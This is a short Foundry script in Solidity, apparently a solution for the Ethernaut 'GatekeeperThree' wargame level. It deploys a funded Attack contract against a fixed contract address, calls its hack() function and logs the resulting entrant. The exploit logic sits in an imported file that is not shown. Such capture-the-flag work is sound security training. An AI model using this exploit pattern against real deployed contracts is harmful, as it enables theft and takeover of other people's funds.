// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../instances/GatekeeperThree.sol";
import "../src/GatekeeperThreeAttack.sol";

contract POC is Script {

    GatekeeperThree gatekeeperThree = GatekeeperThree(payable(address(0x56F3D51A7c5C32748f22197cc054E03fe37a72c8)));

    function run() external{
        vm.startBroadcast();

        uint amount = 0.001 ether + 1 wei;
        Attack atk = new Attack{value: amount}(payable(address(gatekeeperThree)));
        atk.hack();

        console.log(gatekeeperThree.entrant());
        
        vm.stopBroadcast();
    }
}


